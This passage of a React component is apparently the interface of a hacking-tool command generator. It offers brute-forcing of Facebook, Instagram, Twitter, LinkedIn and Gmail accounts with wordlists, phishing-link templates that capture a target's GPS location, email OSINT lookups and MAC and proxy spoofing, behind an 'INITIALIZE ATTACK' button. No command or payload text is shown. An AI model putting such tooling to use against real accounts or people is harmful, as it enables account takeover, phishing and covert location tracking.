                                <label className="text-cyber-matrix text-xs font-bold">PLATFORM</label>
                                <select value={socialPlatform} onChange={(e) => setSocialPlatform(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono focus:border-cyber-matrix">
                                    <option value="facebook">FACEBOOK</option>
                                    <option value="instagram">INSTAGRAM</option>
                                    <option value="twitter">TWITTER/X</option>
                                    <option value="linkedin">LINKEDIN</option>
                                    <option value="gmail">GMAIL (Google)</option>
                                </select>
                            </div>
                            <div className="space-y-2">
                                <label className="text-cyber-matrix text-xs font-bold">ATTACK MODE</label>
                                <select value={attackMode} onChange={(e) => setAttackMode(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono focus:border-cyber-matrix">
                                    <option value="WORDLIST">STANDARD WORDLIST (RockYou)</option>
                                    <option value="ALL_PATTERNS">ALL PATTERNS (A-Z, 0-9, Symbols)</option>
                                    <option value="PIN_CODE">NUMERIC (Pin Codes)</option>
                                </select>
                            </div>
                        </>
                     )}

                     {socialTool === 'SEEKER' && (
                        <div className="col-span-2 space-y-4">
                             <div className="space-y-2">
                                <label className="text-cyber-matrix text-xs font-bold">PHISHING TEMPLATE</label>
                                <select value={seekerTemplate} onChange={(e) => setSeekerTemplate(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono focus:border-cyber-matrix">
                                    <option value="google_drive">Google Drive (Download File)</option>
                                    <option value="whatsapp">WhatsApp (Join Group)</option>
                                    <option value="instagram">Instagram (Login)</option>
                                    <option value="near_you">Find People Near You (Dating)</option>
                                </select>
                            </div>
                             <div className="p-3 border border-red-900/50 bg-red-900/10 rounded text-[10px] text-red-400 font-mono">
                                [WARN] This tool generates a link. If the target clicks 'Allow Location', high-accuracy GPS coordinates will be displayed in the terminal below.
                             </div>
                        </div>
                     )}

                     {socialTool !== 'CUPP' && socialTool !== 'SETOOLKIT' && socialTool !== 'SEEKER' && (
                         <div className="col-span-2 space-y-2">
                            <label className="text-cyber-matrix text-xs font-bold">
                                {['HOLEHE', 'GHUNT', 'BREACH_PARSE'].includes(socialTool) ? 'TARGET EMAIL' : 'TARGET USERNAME / EMAIL'}
                            </label>
                            <input 
                                type="text" 
                                value={username} 
                                onChange={(e) => setUsername(e.target.value)} 
                                className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono placeholder-gray-700" 
                                placeholder={['HOLEHE', 'GHUNT', 'BREACH_PARSE', 'H8MAIL'].includes(socialTool) ? 'target@email.com' : 'target_username'} 
                            />
                         </div>
                     )}
                   </>
                )}

                {/* --- ANON OPS --- */}
                {activeCategory === 'ANON' && (
                  <>
                     <div className="space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">STEALTH METHOD</label>
                        <select 
                            value={anonTool}
                            onChange={(e) => setAnonTool(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                        >
                            <option value="MACCHANGER">MAC ADDRESS SPOOF</option>
                            <option value="PROXYCHAINS">PROXYCHAINS (Tor)</option>
                            <option value="VPN">OPENVPN</option>
                        </select>
                     </div>
                     <div className="space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">
                             {anonTool === 'MACCHANGER' ? 'INTERFACE' : (anonTool === 'VPN' ? 'CONFIG NAME' : 'TARGET SITE')}
                        </label>
                        {anonTool === 'MACCHANGER' ? (
                            <input type="text" value={interfaceName} onChange={(e) => setInterfaceName(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
                        ) : (
                            <input type="text" placeholder={anonTool === 'VPN' ? 'my_vpn_config' : 'dnsleaktest.com'} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" disabled={anonTool === 'PROXYCHAINS'} />
                        )}
                     </div>
                  </>
                )}

                {/* --- FORENSICS OPS --- */}
                {activeCategory === 'FORENSICS' && (
                  <>
                     <div className="space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">FORENSIC TOOL</label>
                        <select 
                            value={forensicsTool}
                            onChange={(e) => setForensicsTool(e.target.value)}
                            className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded focus:border-cyber-matrix outline-none font-mono"
                        >
                            <option value="EXIFTOOL">EXIFTOOL (Metadata)</option>
                            <option value="BINWALK">BINWALK (Firmware)</option>
                            <option value="STRINGS">STRINGS (Text Extraction)</option>
                            <option value="WIRESHARK">WIRESHARK (Pcap Analysis)</option>
                        </select>
                     </div>
                     <div className="space-y-2">
                        <label className="text-cyber-matrix text-xs font-bold">FILE PATH</label>
                        <input type="text" value={targetFile} onChange={(e) => setTargetFile(e.target.value)} className="w-full bg-gray-900 border border-gray-700 text-white p-2 rounded outline-none font-mono" />
                     </div>
                  </>
                )}

              </div>

              {/* Output Area */}
              <div className="bg-black border border-gray-800 rounded p-4 mt-auto">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-gray-400 text-xs font-mono">GENERATED_COMMAND_PREVIEW</span>
                  <div className="flex gap-2">
                      <button 
                        onClick={startSimulation}
                        className="text-xs bg-red-600 text-black px-4 py-2 rounded font-bold hover:bg-red-500 transition-all shadow-[0_0_10px_rgba(220,38,38,0.4)] flex items-center gap-2"
                      >
                        <i className="fas fa-terminal"></i> INITIALIZE ATTACK
                      </button>
                      <button 
                        onClick={copyToClipboard}
                        className="text-xs bg-gray-800 text-white px-3 py-2 rounded font-bold hover:bg-gray-700 transition-colors"
                      >
                        <i className="fas fa-copy"></i>
                      </button>
                  </div>
                </div>
                <div className="font-mono text-green-500 break-all bg-gray-900/50 p-4 rounded border border-green-900/30 shadow-[inset_0_0_20px_rgba(0,0,0,0.5)]">
                  <span className="text-blue-400 mr-2 select-none">root@kali:~#</span>
                  {generateCommand()}
                  <span className="animate-pulse ml-1">_</span>
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
